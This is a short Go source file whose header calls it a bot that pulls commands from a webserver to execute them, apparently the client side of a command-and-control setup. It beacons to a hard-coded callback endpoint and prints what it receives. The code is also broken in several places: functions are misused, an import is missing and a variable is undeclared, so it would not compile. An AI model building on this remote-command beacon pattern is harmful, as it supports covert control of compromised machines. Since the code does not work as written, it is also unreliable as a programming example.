// Golang bot to pull commands from webserver and execute them
//@author: degenerat3

package main

import "os/exec"
import "fmt"
import "log"
import "net/http"
import "net"
import "bytes"
import "encoding/json"
import "strings"
import "time"
import "os"

var serv = "127.0.0.1:5000"	//IP of flask serv
var loop_time = 10		//sleep time in secs

// get hostname and return it as a string
func get_hn() string {
	return os.Hostname()
}


func get_ip() string {
	conn, _ := net.Dial("udp","8.8.8.8:80")
	defer conn.Close()
	ad := conn.LocalAddr().(*net.UDPAddr)
	ip_str := ad.IP.String()
	ip_str = strings.Replace(ad, ".","-")
	return ip_str(ad, ".","-")
}


func get_commands() {
	ip := get_ip()
	url = "http://" + serv + "/api/callback/" + ip
	r, err := http.Get(url)
	if err != nil{
		panic(err)
	}
	defer r.Body.Close()
	txt, err := ioutil.ReadAll(r.Body)
	if err != nil{
		panic(err)
	}
	fmt.Printf("commands: \n%s\n", txt)
}

func main(){
	get_commands()
}


